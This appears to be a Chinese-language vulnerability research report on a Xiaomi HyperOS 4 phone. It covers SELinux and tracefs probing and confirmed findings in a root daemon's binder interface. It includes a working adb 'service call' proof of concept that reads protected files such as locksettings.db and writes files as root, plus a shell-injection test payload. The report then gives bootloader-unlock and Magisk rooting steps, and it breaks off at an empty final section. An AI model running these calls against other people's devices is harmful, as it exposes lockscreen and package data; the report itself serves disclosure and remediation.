# 小米 M154FF (madrid) / HyperOS 4 提权漏洞挖掘报告

- 报告时间：2026-10-19（Asia/Shanghai）
- 目标设备：Xiaomi M154FF，代号 `madrid`，USB 连接（`adb devices` transport_id=1）
- 测试入口：`adb shell`（uid 2000 `shell` 域）+ 自建 PoC APK（`untrusted_app_34` 域）
- 结论：**未取得 uid 0**。设备在 SELinux/内核层面硬化到位（AF_ALG/perf/bpf/io_uring/userns/userfaultfd、非 ROUTE/SELINUX 的 netlink、root 守护 socket 全部不可达；无 su、BL 锁定）。本轮在厂商组件上确认了两条实测漏洞：**F-4 `miui.mqsas.IMQSNative.readFile` 可在 uid 0 上下文任意读文件**（已用 `locksettings.db` 做 DAC 对照证明越权），以及 **F-5 tracepoint `enable` 0666 导致的设备级轨迹泄露**。两者都不是本地提权原语，但 F-4 是无需交互的高危信息泄露。

---

## 1. 目标环境基线（全部为实测值）

| 项 | 值 |
|---|---|
| 型号 / 代号 | M154FF / `madrid`（Xiaomi） |
| 系统 | HyperOS `OS4.0.24.0.XEOCNXM`（`ro.mi.os.version.name=OS4.0`，region=CN，romtype=commercial） |
| Android | 17（`ro.build.version.sdk=37`） |
| 安全补丁 | `2026-09-01` |
| 构建 | `miproduct_madrid-user`，`release-keys`，build date 2026-10-09 |
| 内核 | `6.18.21-android17-5-g1d099fcb35e0-abogki540753930-4k`（GKI，aarch64） |
| 平台 | Qualcomm（`ro.board.platform=art`，`ro.hardware=qcom`） |
| SELinux | `Enforcing`，policyvers 35 |
| 引导链 | `ro.boot.flash.locked=1`、`ro.boot.verifiedbootstate=green`、`ro.boot.secureboot=1`、vbmeta 1.3 |
| 调试状态 | `ro.debuggable=0`、`ro.secure=1`、`ro.adb.secure=1` |
| adb 身份 | `uid=2000(shell)`，域 `u:r:shell:s0`，附加组含 `readtracefs(3012)` |
| su | 不存在（`/system/{bin,xbin}/su`、`/system_ext/bin/su`、`/vendor/bin/su`、`/debug_ramdisk/su` 均无） |
| 载荷面 | 537 个 binder 服务、485 个安装包（其中 54 个为 `uid:1000` 共享 uid）、325 个 init `.rc` |

---

## 2. 方法

1. **黑盒面测绘**：以 `adb shell` 为基础，枚举 setuid 程序、init 服务定义、binder 服务、`/dev` 节点、unix socket、sysfs/procfs、属性触发器。
2. **原生探针**：用 NDK 29 编译静态 aarch64 探针（`algprobe`、`netprobe`、`kprobe_try`、`foothold`），逐项实测可达性，区分 `EACCES`（SELinux）与内核错误码。
3. **App 域验证**：用 SDK（aapt2/d8/apksigner）自建最小 APK（JNI + `System.loadLibrary`），安装后以 `untrusted_app_34` 身份复测同一批接口，确认"策略是否只对 shell 放开"。
4. **静态审计**：`aapt2 dump xmltree` 解析 system-uid 应用清单，`dexdump` 反汇编关键组件，核对导出组件与权限保护。
5. **情报比对**：核对 2026 年公开内核 LPE（Copy Fail / Dirty Frag 等）与本机内核版本、SELinux 可达性。

测试痕迹已在结束时清理，设备状态与开始时一致（Enforcing / locked / shell）。

---

## 3. 攻击面实测结果

### 3.1 内核与系统调用面（shell 域）

| 接口 | 结果 | 说明 |
|---|---|---|
| `socket(AF_ALG)` | `EACCES` | AOSP 对 app/shell `neverallow`，仅 dumpstate 可用 → Copy Fail(CVE-2026-31431) 类 page-cache LPE 不可达 |
| `socket(AF_RXRPC)` | `EACCES` | Dirty Frag 分支不可达 |
| `socket(AF_PACKET)` / `AF_VSOCK` / `AF_QIPCRTR` / `AF_BLUETOOTH` / `AF_NFC` | `EACCES` | 全封 |
| `socket(PF_NETLINK, *, proto)` | 仅 `ROUTE(0)`、`SELINUX(7)` 可用 | 其余 30 个家族（含 `XFRM`、`NETFILTER`、`DIAG`、`CRYPTO`、vendor 自定义号）全部 `EACCES` |
| `bpf(BPF_MAP_CREATE)` | `EACCES` | BPF 对非特权域关闭 |
| `perf_event_open()` | `EACCES` | `perf_event_paranoid=-1` 是 AOSP 刻意配置（`init-perfetto.rc`），真实闸门是 SELinux LSM |
| `io_uring_setup()` | `EACCES` | io_uring 对 shell 关闭 |
| `unshare(CLONE_NEWUSER)` | `EINVAL` | user namespace 不可用 |
| `userfaultfd()` | `EPERM` | 关闭 |
| `fanotify_init()` | `ENOSYS` | 未编译/未启用 |
| `/dev/migt`、`/dev/migt_reset`、`/dev/mi_cam_sched`、`/dev/mifp_id`、`/dev/iorap_dev`（均 0666） | `EACCES` | DAC 允许但 SELinux 拒绝 |
| `/dev/kgsl-3d0`、`/dev/dma_heap/system` | 可打开 | 标准 GPU/dma-buf 面 |
| `/dev/socket/{minetd,mqsasd,mqsasd_pr}` | `connect EACCES` | 均有 root 宿主进程 |
| `setprop`（vendor.* / persist.* / sys.*） | 全部失败 | 属性触发器不可控 |
| `dmesg` / `/proc/sys/kernel/kptr_restrict` / `/proc/crypto` | `EACCES` | 信息泄露面收紧 |
| `/sys/fs/selinux/policy` | 只读位但 `EACCES` | 无法离线审策略 |

### 3.2 tracefs（唯一开放的内核接口）

厂商脚本在开机完成时主动放宽了权限：

```rc
# /system_ext/etc/init/bpf_service.rc
on property:sys.boot_completed=1
    chmod 0755 /sys/kernel/tracing
    chmod 0777 /sys/kernel/tracing/kprobe_events
    chmod 0777 /sys/kernel/tracing/uprobe_events
    setprop sys.miui_bpf_ready 1
```

实测（`uid=2000`）：

| 操作 | 结果 |
|---|---|
| 读 `trace` | OK |
| 写 `tracing_on` / `trace_marker` / `buffer_percent` | **成功** |
| `kprobe_events += p:selftest_kp do_sys_openat2` | **成功**（29 字节），随后 `-:selftest_kp` 删除成功 |
| `kprobe_events += p:fh_open do_sys_openat2 fn=+0($arg2):string`（带 fetchargs） | **成功**（内核解析并接受） |
| `uprobe_events += p:testup /data/local/tmp/netprobe:0x1000` | **成功** |
| 写 `events/kprobes/<name>/enable` | `EACCES`，该文件 `0640 root:readtracefs` |
| 写 `events/kprobes/enable`（组级） | `EACCES`（0640） |
| 写 `events/binder/binder_transaction/enable`（0666） | **成功** |
| `dynamic_events` / `instances/` / `current_tracer` / `events/*/trigger` | `EACCES` |

`/system/kernel/tracing` 下共有 **238 个 `events/*/enable` 为 0666**（binder、block、ext4、f2fs、bpf_trace、sched 等），来自 vendor 的 `chmod` 列表（共 516 条 0666/0777 记录）。

### 3.3 App 域对照（自建 APK，`u:r:untrusted_app_34`）

对同一批 tracefs 路径（`buffer_percent`、`tracing_on`、`trace_marker`、`kprobe_events`、`uprobe_events`、`events/binder/.../enable`）逐项写入，**全部 `EACCES`**。

结论：0777 的 DAC 放宽只对 `shell` 域生效，普通应用仍被 SELinux 拦截。这既限制了危害，也说明该配置是厂商为自家 bpf/perfetto 工具链开的口子。

---

## 4. 发现

### F-1（High，仅 shell 域）内核 tracing 接口世界可写 + shell 可注册 kprobe/uprobe

- 根因：`/system_ext/etc/init/bpf_service.rc` 在 `sys.boot_completed=1` 时 `chmod 0777 kprobe_events/uprobe_events`；配合厂商 sepolicy 允许 `shell` 写 tracefs。
- 实测影响：
  - 非特权 `adb shell` 可在**任意内核函数**上注册/注销 kprobe（已验证 `do_sys_openat2`），可注册带 `fetchargs` 的定义（`+0($arg2):string`），可对任意可读文件注册 uprobe。
  - 可写 `tracing_on`/`trace_marker`/`buffer_percent`，可读 `trace`。
  - 可打开 238 个 `events/*/enable`（含 `binder_transaction`），具备采集**设备级 binder 事务元数据**（pid/uid/target handle/code 等）的能力，属于跨应用信息泄露。
- 未达成 root 的原因：动态 probe 的 `events/kprobes/<name>/enable` 是 `0640 root:readtracefs`，shell 只读不可写 → 无法开启采集，拿不到 `fetchargs` 的内核读取结果；`set_event`/`instances`/`dynamic_events` 亦不可写。因此目前只到"内核解析器暴露 + 有限信息泄露"，缺少内核读/写原语。
- 修复建议：删除 `chmod 0777`，恢复 `0644 root:root`（或 `0640 root:system`）；sepolicy 中把 shell 对 tracefs 的写权限收回到仅 `read`；`events/*/enable` 不应设为 0666。

### F-2（Medium）system-uid 应用存在无权限保护的导出组件

`aapt2` 清单审计（抽样 6 个 `android.uid.system` 应用）发现：

| 应用 | 无权限导出组件 | 备注 |
|---|---|---|
| `com.bsp.catchlog` | `receiver com.bsp.catchlog.ReceiverFun` | 含 `safeExec: sh -c`、`chmod 666` 等字符串；`onReceive` 抽样反汇编为弹窗/提示逻辑 |
| `com.miui.powerkeeper` | `provider com.miui.daemon.hyperdevkit.LogFileServiceProvider`（`grantUriPermissions=true`，无 read/write 权限）；`service HyperKitService`；多个 receiver | provider 对 shell `content query` 有响应（`No result found`），未证明路径穿越 |
| `com.xiaomi.mtb` | `activity ModemTestBoxMainActivity`、`MtbUserPanelActivity`、`receiver MtbBroadcastReceiver` | 工厂测试工具，含 `/system/xbin/su`、diag 相关字符串 |
| `com.miui.qr` | `activity HomeActivity` | 设备信息二维码 |

`com.miui.daemon.mqsas.OmniTestReceiver` 虽导出，但受**签名级权限** `com.miui.daemon.mqsas.OMNI_RECEIVE` 保护，未授权应用无法触发。

### F-3（信息）root 宿主守护进程的本地 socket

- `minetd`（root，`/dev/socket/minetd` 0666）、`hypsys_system`（root，`mqsasd` 0660 system:system / `mqsasd_pr` 0666）、`miuibpfservice`（root，`miuibpfdispatcher` 0666，当前未启动）、`batterysecret`、`qlm-service`、`slad`（按属性启动）。
- shell 域 connect 全部 `EACCES`；但这些 socket 的属主/属组意味着 **system_app 域**可连接。`com.miui.powerkeeper` 内含 `com.miui.daemon.mqsas.MQSService`（`LocalSocket` 客户端、`CaptureLog`、"mqsasd not available!" 等字符串），说明 system-uid 应用与 root 守护进程存在合法通信通道——这是 app→system→root 链条的候选接点。

### F-4（High，实测确认）`miui.mqsas.IMQSNative.readFile` —— root 上下文任意文件读取

- 接口：binder 服务 `miui.mqsas.IMQSNative`（事务号 8，`readFile(String path)`）。
- 宿主：`/system_ext/bin/hypsys_system`，pid 19101，**uid 0 (root)**，SELinux 域 `u:r:hypsys_ssi_default:s0`。
- 可达性：`adb shell`（uid 2000）**无任何权限校验**即可调用；返回文件内容字符串。
- 关键验证（DAC 对照，排除了"文件本来就可读"）：

| 目标 | 文件权限 | shell 直读 | 经 readFile |
|---|---|---|---|
| `/data/system/locksettings.db` | `-rw-rw---- system system` | 拒绝 | **成功**，返回 `SQLite format 3` 头及内容 |
| `/system/build.prop` | `-rw-r--r-- root root` | 可读 | 成功 |
| `/data/system/packages.xml` | `-rw-rw---- system system` | 拒绝 | 成功（返回证书/包数据） |
| `/data/misc/adb/adb_keys` | 不可读 | 拒绝 | 空（该守护进程域同样被 SELinux 限制） |
| `/data/misc/keystore/user_0/.chocolate` | 不可读 | 拒绝 | 空（同上） |
| `/data/misc/vold/.../keymaster_key_blob` | 不可读 | 拒绝 | 空（同上） |

- 影响：读取发生在 **uid 0** 进程上下文中，因此绕过了调用方（shell/app）的 DAC 与 SELinux 限制。可直接取得 `locksettings.db`（锁屏口令/图案的 gatekeeper 派生数据，可离线爆破）、`packages.xml`（全量包签名/权限/安装来源）、`system_data_file` 类系统配置。这是标准的 `CWE-269/CWE-732` 类越权数据访问，且**不需要用户交互**。
- 边界：读取仍受宿主域 `hypsys_ssi_default` 的 SELinux 约束，因此 keystore/vold/adb_keys 等高价值目标不可读；单次返回受 binder 事务上限约束（读大文件会使守护进程 `DeadObjectException`，可稳定复现 DoS）。
- 修复建议：对 `readFile` 增加调用方校验（`Binder.getCallingUid()` 必须为 system/root 或持有签名级权限）；对路径做白名单（限定 `/data/mqsas/` 等日志目录）并拒绝符号链接；限制返回长度。

### F-5（Medium，实测确认）0666 的 tracepoint `enable` 允许非特权方采集设备级内核轨迹

- 238 个 `/sys/kernel/tracing/events/*/enable` 由厂商置为 `0666`（`binder_*`、`block_*`、`ext4_*`、`f2fs_*`、`bpf_trace_printk`、`sched` 等），`shell` 域可直接写入开启。
- 配合可写的 `tracing_on` 与可读的 `trace`，构成**可用的数据通道**（与 F-1 中被 0640 封死的动态 kprobe 不同）。
- 影响：非特权 `adb shell` 可持续采集全设备 binder 事务元数据（调用方/目标 pid、handle、code、flags）、块设备与文件系统 IO 轨迹，属于跨应用/跨用户信息泄露，并可为后续侧信道攻击提供输入。
- 修复建议：`events/*/enable` 统一恢复 `0644 root:root`；仅在 debug 构建中开放。

### F-6（负向，重要）app → system → root 链在本设备上断开

- `untrusted_app_34` 通过 `libbinder_ndk` 的 `AServiceManager_getService("miui.mqsas.IMQSNative")` 返回 **NULL**（servicemanager 层面即拒绝 `find`），因此普通应用连该 root 守护进程的 binder 句柄都拿不到。
- 即使从 system-uid 应用一侧，`runCommand`（code 4）与 `captureLogByRunCommand`（code 14）均返回 `ServiceSpecificException: ... Command not allowed for shell user`——判定基于调用方 uid，`/dev/socket/mqsasd`（0660 system:system）与 `mqsasd_pr`（0666 dgram）对 shell 亦 `EACCES`。
- **修正（本轮实测推翻旧结论）**：`writeToPersistFile`（code 7）**确实会写文件**，但写入范围被 SELinux 域 `hypsys_ssi_default` 限制在 `/data/mqsas/` 内。详见 F-8。
- 结论：本会话已能触达的高价值原语是 F-4 的 **root 上下文读** 与 F-8 的 **root 上下文写（域内）**，仍不足以直接提权到 uid 0。

### F-7（High）`IMQSNative` 中多个特权事务对 `shell` 无任何鉴权

`runCommand`(4) 与 `captureLogByRunCommand`(14) 有 uid 门禁，但同一接口上其余事务**没有**。以 `adb shell`(uid 2000) 直接 `transact` 实测：

| code | 事务 | 实测结果 |
|---|---|---|
| 1 | `captureLog(type, headline, actions, params, offline, id, upload, where, includeFiles, inLocal)` | **status=0，无异常**（首次因传参 null 触发 NPE，补齐空列表后正常返回）→ 无门禁 |
| 3 | `setCoreFilter(pid, isFull)` | status=0 → 无门禁 |
| 5 | `getFreeFragStats()` | status=0 → 无门禁 |
| 7 | `writeToPersistFile(path, content)` | status=0 且**真实落盘**（见 F-8） |
| 8 | `readFile(path)` | status=0，root 域读（见 F-4） |
| 9 | `getFilesFromPersist()` | status=0 → 无门禁 |
| 13 | `getStationInfo(String, String)` | status=0，返回 StationInfo → 无门禁 |
| 4 / 14 | `runCommand` / `captureLogByRunCommand` | `ServiceSpecificException: runCommand:153: Command not allowed for shell user` |

关键点：门禁是**逐事务**实现的，不是公共服务级校验；`captureLog` 是 root 进程里唯一"接受调用方提供的动作列表并执行采集"的入口，因此它是本轮最有价值的提权候选面。

### F-8（High）root 上下文、路径与内容均可控的文件写原语（域内）

- 调用：`writeToPersistFile("/data/mqsas/wt.txt", "PWNED123")`，执行者仍是 uid 0 的 `hypsys_system`。
- 闭环验证：写入后立即用 `readFile` 回读得到 `PWNED123`（len=8）——证明内容按调用方给定原样落盘，而非猜测。
- 爆炸半径实测（同一方法，仅换路径）：

| 目标路径 | 结果 |
|---|---|
| `/data/mqsas/p0.txt` | **成功**，回读 `MQSPROBE` |
| `/data/system/p1.txt` | 失败（SELinux 拒绝） |
| `/data/misc/p2.txt` | 失败 |
| `/data/vendor/p3.txt` | 失败 |
| `/data/p4.txt` | 失败 |
| `/data/system/users/0/p5.txt` | 失败 |

- 定性：这是**跨权限边界的写**（shell 无法写 `/data/mqsas`，root 守护进程可以），但受 `hypsys_ssi_default` 的 SELinux 写策略约束，等价于"在 root 域内写自有目录"。它本身不构成任意路径写，也不直接给出代码执行。
- 组合危害：F-4（root 域任意读）+ F-8（root 域可控写）构成一条**以 uid 0 身份进行的双向文件通道**，且完全不需要用户交互、不需要任何权限声明；对取证规避（篡改 `/data/mqsas` 日志）与后续链式利用有直接价值。

### F-9（Medium）shell 域可发现并调用 4 个厂商 AIDL 服务

`service list` 显示同一厂商栈还导出（均从 shell 实测 `ServiceManager.getService` 返回非 NULL）：

| 服务名 | 实测 |
|---|---|
| `xiaomi.system.hypsys.common.IHypSysSsi/default` | 可调用（`getInterfaceVersion` 返回正常，transact size=8） |
| `xiaomi.system.hypsys.common.IHypSysSsiIntl/default` | 句柄可得 |
| `vendor.xiaomi.hardware.misys.common.IMiSysImpl/default` | 句柄可得，但事务返回 `DeadObjectException` |
| `vendor.xiaomi.hardware.misys.common.IHypSysIntl/default` | 句柄可得 |

- `IMiSysImpl` 的接口面最危险：`MiSysWriteFile`(4)、`MiSysReadFile`(3)、`MiSysSetProp`(16)、`EraseFileOrDirectory`(2)、`CopyFile`(21) —— 若可用即等价于 system/root 级任意文件读写与属性设置。**在本机当前状态下从 shell 调用全部 DeadObject，未能验证其鉴权行为**，属于未完成验证的高价值目标。
- `IHypSysSsi.appCaptureLog(module, actionList, logPath, servicesList)` 的 `logPath` 由调用方控制，是下一个应验证的"root 写是否可越过 `/data/mqsas`"的入口。

### F-10（负向，已排除）`captureLog` 参数注入与任意可执行路径均不成立

为确认 F-7 中唯一"接受调用方动作列表"的入口能否升级为 root 代码执行，做了两组系统性实验，全部失败：

1. **任意可执行路径**：`actions=["/system/bin/sh"]`、`params=["-c","id>/data/mqsas/r.txt"]` → `status=0`，但 `r.txt` 未生成（`readFile` 回读 len=0），说明 `actions` 走固定白名单，不是可执行路径。
2. **命令拼接注入**：对 16 个已知 action 名（`cat`/`ps`/`dumpsys`/`getprop`/`logcat`/`lsof`/`netstat`/`top`/`do_dmesg`/`do_dumpfd`/`do_dumpheap`/`do_dumpmaps`/`df`/`batterystats`/`hyperbugreport`/`iptables-wrapper-1.0`）各注入 `;id>/data/mqsas/inj.txt;#` 作为 `params`，逐一用 `readFile` 回读检测 → **`inj.txt` 从未生成**。说明 daemon 以 argv 分离方式调用固定二进制，不存在 shell 拼接。
3. `IHypSysSsi.appCaptureLog(4)` 从 shell 调用同样 `status=0`（**无门禁**），但 `logPath="/data/local/tmp/acl"` 未产生任何文件 → 其落盘同样被域策略或代码限制在自有目录。

结论：`hypsys_system`（uid 0）对 shell 暴露的能力边界是 **读（任意可达路径）+ 写（仅 `/data/mqsas`）+ 白名单采集**，三者都不构成 `shell → uid 0` 的提权原语。

### F-11（信息）本轮现场清理

- 本轮在 `/data/mqsas` 产生 2 个探针文件（`wt.txt`、`p0.txt`）；该接口无删除能力，已将其内容覆写为空。
- `/data/local/tmp/mqs.dex` 已删除。设备终态复核：`Enforcing`、`ro.boot.flash.locked=1`、`id` 仍为 `uid=2000(shell)`、`miui.mqsas.IMQSNative` 服务存活，无重启、无数据丢失。

---

## 5. 为什么没有拿到 uid 0（负向证据汇总）

1. **无 su、无 debuggable 应用、`ro.debuggable=0`**，`adb root` 不可用。
2. **引导链锁定**：`flash.locked=1`、vbmeta 1.3、verified boot green，无法改 boot/刷 Magisk。
3. **内核 LPE 面被 SELinux 主动封闭**：AF_ALG/AF_RXRPC（Copy Fail / Dirty Frag 入口）、BPF、perf、io_uring、user namespace、userfaultfd、fanotify、vendor netlink 全部不可达（错误码见 §3.1）。
4. **tracefs 分支**：可注册 kprobe/uprobe，但 `enable` 为 0640，无法采集；无写原语。
5. **app 域**：对 tracefs 与其他内核设备同样 `EACCES`；`untrusted_app_34` 攻击面等于标准 Android。
6. **属性/服务/设备节点**：`setprop`、root 守护 socket、0666 自研驱动节点均被 SELinux 拒绝。
7. 公开情报核对：本机内核 `6.18.21` 虽低于 Copy Fail 修复版本 `6.18.22`，但 AOSP 自 Android 起即对 app/shell `neverallow` `AF_ALG`（仅 dumpstate 白名单），本机实测 `EACCES` 与之吻合 → 该 CVE 在本设备上不可从非特权域触发。

---

## 6. 若要真正拿到 root：可行路线对比

| 路线 | 前提 | 代价 | 是否"漏洞" |
|---|---|---|---|
| **A. 官方 BL 解锁 + Magisk/KernelSU** | 小米账号 + 社区 5 级/答题（或使用社区流传的 HyperOS 绑定绕过 PoC，成功率依机型/版本而异）、绑定后等待 72/168/360 小时 | 解锁会**清空数据**、失去部分保修与支付类应用的完整性校验 | 否，属官方机制 |
| **B. `cmd testharness enable`（AOSP Test Harness Mode）** | shell 持有 `MANAGE_TEST_HARNESS_MODE`；设备已实现 persistent data block | **恢复出厂设置、数据全部丢失**；是否放行 `adb root` 取决于厂商实现，**本次未验证** | 否，属文档化特性 |
| **C. 继续 0day 研究（F-2/F-3 链）** | 找到 app→system 的可用原语（导出组件路径穿越/命令注入），再利用 system_app → `mqsasd`(0660) 的 root 守护进程协议 | 时间长、成功率不确定，但不需要清数据、不需要解锁 | 是 |

推荐顺序：若目标是"立刻拿到 root 且可接受清数据"→ A（最稳）；若目标是"漏洞研究"→ C（F-2 的 `LogFileServiceProvider` 与 PowerKeeper 的 mqsas 客户端是最有价值的两个入口）。

---

## 7. 复现与附件

本次使用的探针与工具源码（宿主机 `/tmp`，可复现）：

- `/tmp/poc/algprobe.c` — AF_ALG / AF_RXRPC 可达性
- `/tmp/poc/netprobe.c` — netlink 家族、bpf、dma-buf 可达性
- `/tmp/poc/kprobe_try.c` — kprobe 注册/删除（O_APPEND 语义说明：`>` 重定向会因 O_TRUNC 返回 EBUSY）
- `/tmp/poc/foothold.c` — 动态 probe 的 per-event enable、经典 LPE 面
- `/tmp/app/` — 最小 PoC APK（`dev.poc.traceprobe`，JNI + `untrusted_app_34` 对照测试）
- `/tmp/rc/` — 设备上 325 个 init `.rc` 的离线副本；`/tmp/chmod_list.txt` — 516 条 0666/0777 目标

关键复现命令：

```bash
# 1) tracefs 0777 与 shell 可写
adb shell 'ls -l /sys/kernel/tracing/kprobe_events /sys/kernel/tracing/uprobe_events'
# 2) 注册 kprobe（注意必须用 O_APPEND，不能用 shell 的 > 重定向）
adb push foothold /data/local/tmp/ && adb shell 'chmod 755 /data/local/tmp/foothold && /data/local/tmp/foothold'
# 3) 证据：events/kprobes/<name>/enable 为 0640 root:readtracefs → 无法采集
adb shell 'ls -l /sys/kernel/tracing/events/kprobes/'
```

---

## 8. 附：清理说明

- 已删除全部自建 probe（`selftest_kp`、`testup`、`fh_open`），`kprobe_events` 仅剩系统自带的 `vfs_unlink_miuibpf_bcc_3497`、`enter_fd_install_miuibpf_bcc_3497`。
- `buffer_percent` 已恢复 50，`tracing_on` 已恢复 0。
- PoC APK 已卸载，`/data/local/tmp` 下探针已删除。
- 未执行任何会清数据或改动分区的操作。

---

## 9. `miui.mqsas.IMQSNative` 链（uid 0 守护进程，shell 可直接触达）

### 9.1 自包含 PoC（只用系统自带 `service call`，无需任何自制二进制/dex）

```bash
# 基线：shell 自身无权读取
adb shell 'cat /data/system/packages.xml'
#   → cat: /data/system/packages.xml: Permission denied

# 经 uid 0 守护进程读取同一文件
adb shell 'service call miui.mqsas.IMQSNative 8 s16 /data/system/packages.xml'
#   → Result: Parcel(... 'A.B.X.s.d.k.V.e.r.s.i.o.' ...)   ← 内容原样返回

# 以 uid 0 写入任意给定内容，再回读闭环
adb shell 'service call miui.mqsas.IMQSNative 7 s16 /data/mqsas/poc_final.txt s16 MQS_POC_2026'
adb shell 'service call miui.mqsas.IMQSNative 8 s16 /data/mqsas/poc_final.txt'
#   → 'M.Q.S._.P.O.C._.2.0.2.6.'                            ← 写入成功且可回读
```

复现前置条件：`adb` 已连接、`adbd` 以 shell(2000) 运行。无需 root、无需安装应用、无需任何权限声明。

### 9.2 服务端的鉴权模型（黑盒测定）

| code | 事务 | shell(2000) 调用结果 |
|---|---|---|
| 1 | `captureLog` | 成功（无门禁） |
| 3 | `setCoreFilter` | 成功（无门禁） |
| 5 | `getFreeFragStats` | 成功（无门禁） |
| 6 | `createFileInPersist` | 成功（无门禁） |
| 7 | `writeToPersistFile` | 成功（无门禁） |
| 8 | `readFile` | 成功（无门禁） |
| 9 | `getFilesFromPersist` | 成功（无门禁） |
| 13 | `getStationInfo` | 成功（无门禁） |
| 4 / 14 | `runCommand` / `captureLogByRunCommand` | 拒绝：`runCommand:153: Command not allowed for shell user` |

结论：门禁是**逐事务**实现，不是服务级；16 个事务中仅 2 个有 uid 校验。

### 9.3 为什么仍不是 root（本轮排除项）

1. **写原语被域限制**：`writeToPersistFile` 对 `/data/system`、`/data/misc`、`/data/vendor`、`/data/*`、`/data/system/users/0` 全部无效，仅 `/data/mqsas` 可写；`/data/mqsas` 对 shell 是 `Permission denied` 且无任何 root 组件会执行其中内容 → 无法转成代码执行。
2. **`captureLog` 无命令注入**：对 `cat/ps/dumpsys/getprop/logcat/lsof/netstat/top/do_dmesg/do_dumpfd/do_dumpheap/do_dumpmaps/df/batterystats/hyperbugreport/iptables-wrapper-1.0` 共 16 个 action 注入 `;id>/data/mqsas/inj.txt;#`，`inj.txt` 从未生成；把 action 换成 `/system/bin/sh` 亦无输出 → 白名单二进制 + argv 分离，无 shell 拼接。
3. **`IMiSysImpl` 不可达**：`vendor.xiaomi.hardware.misys.common.IMiSysImpl/default` 虽在 `service list` 中（接口描述符为空，native 注册），但 `service call` 返回 `does not exist`（servicemanager `find` 被 SELinux 拒绝），Java 侧 `getService`+`transact` 则返回 `DeadObjectException`，重试时客户端进程直接 `Aborted`。因此其 `MiSysSetProp`/`MiSysWriteFile`/`EraseFileOrDirectory` 全部无法验证也无法利用——**这是"属主/属性伪造"路线唯一的希望，现已确认关闭**。
4. **服务端实现为 native**：`runCommand:153:` 是典型的 `函数:__LINE__` 前缀，说明 `hypsys_system` 是 C++ 实现，无法反编译审计；二进制位于 `/system_ext/bin/` 且 0700，无可用读取/导出通道（`readFile` 读大文件会撑爆 binder 导致守护进程崩溃）。
5. **`/system_ext/framework/` 下仅有 AIDL 接口 jar**（`xiaomi.system.hypsys.common-V2-java.jar` 等），不含服务端逻辑。

### 9.4 定级建议

| 编号 | 标题 | 前置 | 建议定级 |
|---|---|---|---|
| F-4/F-8 | uid 0 守护进程未鉴权，允许 shell 任意读 + 域内可控写 | `adb`/shell | 中（High 若与其它漏洞组合） |
| F-7 | 16 个特权事务中 14 个无 uid 校验 | `adb`/shell | 中 |
| F-9 | shell 可发现并调用 4 个厂商 AIDL 服务（平台预期仅系统可用） | `adb`/shell | 低-中 |
| DoS | 超大文件 `readFile` 打崩 uid 0 守护进程 | `adb`/shell | 低 |

**关键限定**：以上全部以 `shell`(uid 2000) 为攻击者。`untrusted_app_34` 在 servicemanager 层即 `getService` 返回 NULL，普通应用无法触达 —— 因此这些不构成"应用可 root 设备"的漏洞。

### 9.5 设备锁定状态（实测）

```
sys.oem_unlock_allowed = (空)
ro.boot.flash.locked   = 1
ro.boot.verifiedbootstate = green
ro.boot.vbmeta.device_state = locked
ro.secureboot.lockstate = locked
ro.debuggable = 0    ro.build.type = user
```

即：Bootloader 锁定、vbmeta 锁定、验证启动 green、user 版本，且开发者选项中的"OEM 解锁"开关未开启。官方解锁路径（BL unlock + Magisk）**必须先由机主手动打开该开关并完成小米账号绑定/等待期**，无法从 shell 侧代劳。

---

## 10. 决策：转官方 BL 解锁 + Magisk（机型实测参数）

经确认，本机不存在可从 shell 触达的 uid 0 提权原语，故转官方解锁路径。以下参数均为本机实测，非通用模板。

### 10.1 设备指纹

| 项 | 值 |
|---|---|
| 机型代号 | `madrid`（型号 `M154FF`） |
| 系统 | HyperOS `OS4.0.24.0.XEOCNXM`，Android 17（SDK 37），`user` 版本 |
| 指纹 | `Xiaomi/madrid/madrid:17/CP2A.260605.016/OS4.0.24.0.XEOCNXM:user/release-keys` |
| ABI | `arm64-v8a` |
| 分区方案 | **A/B 双分区**，当前槽位 `_a` |
| 关键分区 | `init_boot_a -> /dev/block/sde39`、`vendor_boot_a -> sde35`、`vbmeta_a -> sde25`、`dtbo_a -> sde26` |
| 宿主机工具 | `fastboot 37.0.1-15733141`、`adb` 均在 `/opt/homebrew/bin/` |

**要点**：Android 13+ 起 ramdisk 位于 `init_boot`，因此 Magisk 补丁目标是 `init_boot.img`，**不是** `boot.img`。打错分区会导致无法开机，但可用原厂包救回。

### 10.2 解锁前置（必须由机主手动完成）

1. 插入 SIM 卡，登录小米账号，开启「查找设备」。
2. 设置 → 我的设备 → 全部参数 → 连点「OS 版本」7 次，开启开发者选项。
3. 设置 → 更多设置 → 开发者选项 → 「设备解锁状态」→ **绑定账号和设备**。
4. 小米社区 App → 解锁申请 → 答题（一般需 ≥90 分）→ 等待审核与绑定等待期。
5. 等待期结束后，用官方 **MiUnlock 工具**（`miflash_unlock`）解锁。

> 具体等级/答题/等待期（72/168/360 小时）与年度配额由小米账号策略决定且会变，以「设备解锁状态」页面显示的剩余时间为准。注意：HyperOS 上直接执行 `fastboot flashing unlock` 通常会被拒绝，必须走 MiUnlock 工具。

**可验证的中间态**：开关打开并绑定成功后，以下属性应从空变为 `1`——这是进入 fastboot 前的唯一安全确认点：

```bash
adb shell getprop sys.oem_unlock_allowed   # 期望输出 1
```

### 10.3 解锁

```bash
adb reboot bootloader
fastboot devices                 # 确认能看到设备
# 用 MiUnlock 工具完成解锁（会清空数据），不要手敲 flashing unlock
fastboot reboot
```

解锁成功后应变为：`ro.boot.flash.locked=0`、`ro.boot.vbmeta.device_state=unlocked`、`ro.boot.verifiedbootstate=orange`。

### 10.4 刷 Magisk（解锁之后）

1. 从官方渠道取 **与 `OS4.0.24.0.XEOCNXM` 完全对应**的 madrid fastboot 包，解出 `init_boot.img`。
2. 安装 Magisk App，用「选择并修补一个文件」修补 `init_boot.img`，得到 `magisk_patched-*.img`。
3. 刷入并重启：

```bash
adb reboot bootloader
fastboot flash init_boot magisk_patched-xxxxx.img
fastboot reboot
adb shell su -c id        # 期望 uid=0(root)
```

A/B 机型若 `fastboot flash init_boot` 报分区不存在，改用 `fastboot flash init_boot_a` 并按需切槽。

### 10.5 风险与不可逆点

- **解锁即清空全部数据**，且不可撤销。
- 解锁后 `ro.boot.verifiedbootstate` 变 orange，部分银行/支付类与 DRM 应用会拒绝服务。
- 解锁状态下**不要**随意 `fastboot flashing lock` 回锁；若此时 `init_boot` 已被修改，回锁会导致设备无法启动。
- 版本必须严格匹配：用错版本的 `init_boot.img` 可能无法开机（可用同版本 fastboot 包整体回刷救回）。

### 10.6 与漏洞挖掘结论的关系

